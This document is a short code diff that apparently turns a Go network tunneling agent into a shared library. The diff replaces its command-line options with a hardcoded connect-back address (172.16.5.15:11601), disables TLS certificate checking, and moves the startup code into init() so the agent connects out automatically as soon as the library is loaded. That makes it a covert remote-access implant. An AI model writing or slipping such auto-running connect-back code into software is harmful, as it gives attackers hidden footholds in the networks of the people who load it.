@@ -20,38 +20,44 @@ import (
 	"time"
 )
 
+import "C"
+
 var listenerConntrack map[int32]net.Conn
 var listenerMap map[int32]net.Listener
 var connTrackID int32
 var listenerID int32
 
-func main() {
+func main() {}
+
+func init() {_main()}
+
+func _main() {
 	var tlsConfig tls.Config
-	var ignoreCertificate = flag.Bool("ignore-cert", false, "ignore TLS certificate validation (dangerous), only for debug purposes")
-	var verbose = flag.Bool("v", false, "enable verbose mode")
-	var retry = flag.Bool("retry", false, "auto-retry on error")
-	var socksProxy = flag.String("socks", "", "socks5 proxy address (ip:port)")
-	var socksUser = flag.String("socks-user", "", "socks5 username")
-	var socksPass = flag.String("socks-pass", "", "socks5 password")
-	var serverAddr = flag.String("connect", "", "the target (domain:port)")
+	var ignoreCertificate = true
+	var verbose = false
+	var retry = false
+	var socksProxy = ""
+	var socksUser = ""
+	var socksPass = ""
+	var serverAddr = "172.16.5.15:11601"
 
 	flag.Parse()
 
-	logrus.SetReportCaller(*verbose)
+	logrus.SetReportCaller(verbose)
 
-	if *verbose {
+	if verbose {
 		logrus.SetLevel(logrus.DebugLevel)
 	}
 
-	if *serverAddr == "" {
+	if serverAddr == "" {
 		logrus.Fatal("please, specify the target host user -connect host:port")
 	}
-	host, _, err := net.SplitHostPort(*serverAddr)
+	host, _, err := net.SplitHostPort(serverAddr)
 	if err != nil {
 		logrus.Fatal("invalid connect address, please use host:port")
 	}
 	tlsConfig.ServerName = host
-	if *ignoreCertificate {
+	if ignoreCertificate {
 		logrus.Warn("warning, certificate validation disabled")
 		tlsConfig.InsecureSkipVerify = true
 	}
@@ -63,19 +69,19 @@ func main() {
 
 	for {
 		var err error
-		if *socksProxy != "" {
-			if _, _, err := net.SplitHostPort(*socksProxy); err != nil {
+		if socksProxy != "" {
+			if _, _, err := net.SplitHostPort(socksProxy); err != nil {
 				logrus.Fatal("invalid socks5 address, please use host:port")
 			}
-			conn, err = sockDial(*serverAddr, *socksProxy, *socksUser, *socksPass)
+			conn, err = sockDial(serverAddr, socksProxy, socksUser, socksPass)
 		} else {
-			conn, err = net.Dial("tcp", *serverAddr)
+			conn, err = net.Dial("tcp", serverAddr)
 		}
 		if err == nil {
 			err = connect(conn, &tlsConfig)
 		}
 		logrus.Errorf("Connection error: %v", err)
-		if *retry {
+		if retry {
 			logrus.Info("Retrying in 5 seconds.")
 			time.Sleep(5 * time.Second)
 		} else {
